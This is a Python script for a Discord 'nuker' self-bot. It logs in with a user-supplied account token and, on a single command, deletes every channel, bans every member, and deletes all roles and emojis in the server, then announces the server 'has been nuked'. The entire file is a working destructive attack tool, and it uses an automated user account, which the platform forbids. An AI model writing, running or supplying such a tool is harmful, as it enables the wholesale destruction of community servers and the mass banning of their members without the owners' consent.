import time
import json
import discord
import threading
from os.path import exists
from discord.ext import commands

from plugins import common


configfile = 'config.json'

def inputtoken():
    global token

    token = input(f"Input Token: ")

    nuke()

def nuke():

    common.clear()
    common.logo()
            
    # process = threading.Thread(target=menu)
    # process.start()

    intents = discord.Intents().default()
    intents.members = True

    bot = commands.Bot(command_prefix='#', self_bot=True, intents=intents)

    @bot.command()
    async def ez(ctx):

        global token

        for channel in ctx.guild.channels: 
            await channel.delete()

        for user in ctx.guild.members:
            if user == bot.user:
                continue
            await user.ban()

        for role in ctx.guild.roles:
            if str(role) == '@everyone':
                continue
            await role.delete()
        
        for emoji in ctx.guild.emojis:
            await emoji.delete()

        print(ctx.guild.name, "has been nuked")

    try:
        bot.run(token, bot=False)
    except discord.LoginFailure:
        print('Invalid Token')
        time.sleep(2.5)

def conf():

    common.logo()

    confirm = input("Type exit to return\n\nPress enter to confirm ").lower()
    if confirm == 'exit':
        print("Alright")
        time.sleep(1)
    else:
        inputtoken()
        nuke()

